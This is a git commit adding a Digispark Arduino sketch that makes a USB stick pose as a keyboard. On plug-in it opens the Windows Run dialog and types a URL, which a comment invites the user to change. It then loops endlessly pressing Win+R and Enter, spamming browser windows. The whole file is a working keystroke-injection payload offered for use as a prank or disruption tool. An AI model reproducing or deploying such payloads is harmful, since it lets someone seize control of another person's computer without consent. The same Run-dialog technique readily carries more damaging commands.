fe8fc806013836ca1d362cc3e6d3c31820917b05
BoKersten <99825528+BoKersten@users.noreply.github.com>
2023-11-22 11:23:53 +0100

    Add files via upload

---
+++ spamChromeTabs/spamChromeTabs.ino
@@ -0,0 +1,20 @@
+#include "DigiKeyboard.h"
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+   DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.println("https://github.com/BoKersten/"); //Change this to the website you want to spam
+  
+}
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+ 
+  
+}
